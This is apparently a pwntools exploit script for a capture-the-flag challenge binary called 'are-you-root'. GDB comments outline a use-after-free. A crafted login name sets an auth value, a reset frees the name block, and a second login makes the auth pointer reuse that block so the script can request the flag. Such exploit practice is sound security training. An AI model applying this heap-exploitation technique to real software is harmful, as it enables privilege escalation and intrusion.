# b *0x5555555555d9
# x/1xg 0x00005555555596d8 # print the crucial byte that should be overwritten
# x/1xg $rbp-0x220 -> to get the auth ptr

# login, set string 5
# reset, freeing name
# auth becomes the name block
# done!

# set name to a really large block
# then chip off regions

from pwn import *

# context.update(arch='x86', os='linux')

p = process("./are-you-root")
print(p.recv())
# print(p.readline())
p.send(b"login " +b"\x47" * 8 + b"\x05" + b"\n")

print(p.recv())

# gdb.attach(p)

p.sendline(b"reset")

print(p.recv())

p.sendline(b"login thing")

print(p.recv())

p.sendline(b"get-flag")

print("flag result:", p.recv())

